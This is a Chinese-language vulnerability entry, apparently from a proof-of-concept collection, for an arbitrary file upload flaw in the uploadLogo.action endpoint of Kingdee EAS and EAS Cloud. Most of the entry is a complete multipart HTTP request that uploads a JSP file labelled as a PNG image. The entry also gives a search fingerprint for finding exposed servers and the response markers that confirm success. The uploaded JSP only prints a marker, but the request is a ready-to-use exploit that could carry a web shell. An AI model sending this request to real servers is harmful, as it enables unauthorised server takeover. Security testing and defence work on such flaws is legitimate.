﻿# 金蝶 EAS与EAS Cloud任意文件上传漏洞

> 更新时间：2024-01-25

> 漏洞编号：

> 漏洞说明：金蝶 EAS 及 EAS Cloud 在 uploadLogo.action 接口处存在文件上传漏洞 恶意攻击者可能上传恶意代码 从而获取服务器控制权限

> 漏洞特征：app="Kingdee-EAS"

> 验证脚本：HTTP

```
POST /plt_portal/setting/uploadLogo.action HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=04844569c7ca7d21a3ca115dca477d62
 
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="chooseLanguage_top"; filename="chooseLanguage_top"
 
ab
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="dataCenter"; filename="dataCenter"
 
ac
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="insId"; filename="insId"
 
 
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="type"; filename="type"
 
ad
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="upload"; filename="dutesite.jsp"
Content-Type: image/png
 
<%out.print("dudesite");%>
--04844569c7ca7d21a3ca115dca477d62--
```

> 响应代码特征：200

> 响应内容特征：nullLogo

> 上传文件定位：


> 验证文件来源：金蝶 EAS与EAS Cloud任意文件上传漏洞.poc
